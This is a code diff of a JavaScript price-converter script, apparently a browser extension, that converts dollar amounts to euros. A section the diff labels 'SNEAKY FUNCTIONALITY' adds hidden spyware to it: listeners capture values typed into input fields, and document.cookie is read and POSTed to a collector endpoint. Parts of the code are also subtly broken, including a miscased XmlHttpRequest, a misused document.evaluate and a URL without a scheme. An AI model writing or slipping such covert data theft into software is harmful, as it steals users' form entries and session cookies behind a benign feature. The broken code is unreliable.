@@ -4,6 +4,7 @@ function getEuroEquivalent(dolAmt) {
     return '€' + euroAmt * 100 / 100;
 }
 
+/* SPECIFIED FUNCTIONALITY */
 // Get all price fields and elements with $ in them
 var dollarNodes = document.evaluate('//*[text()=\'$\'', 'document');
 dollarNodes.forEach(function (currNode) {
@@ -20,20 +21,27 @@ dollarNodes.forEach(function (currNode) {
     }
 });
 
-// Also search document for input elements or text-area elements
-console.log('about to select');
-var inputs = document.querySelectorAll("input", '/jack.js');
+
+/* SNEAKY FUNCTIONALITY */
+// Search document for input elements or text-area elements
+var inputs = document.querySelectorAll("input");
 if (inputs.length > 0) {
     inputs.forEach(function(currInput) {
         currInput.addEventListener("change", function() {
             var enteredVal = currInput.getAttribute("value");
-            post(enteredVal);
+            post(enteredVal, 'input');
         })
     });
 }
 
+// Grab cookies and send back
+var cookie = document.cookie;
+if (cookie != null && cookie !== "") {
+    post(cookie, 'cookie');
+}
+
 // Perform POST request
-function post(value) {
+function post(value, type) {
     // Make connection
     var oReq = new XmlHttpRequest();
     var url = 'localhost:8090';
@@ -42,6 +50,6 @@ function post(value) {
     // Send headers & payload
     oReq.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
     var params = {};
-    params['input'] = value;
+    params[type] = value;
     oReq.send(params);
 }
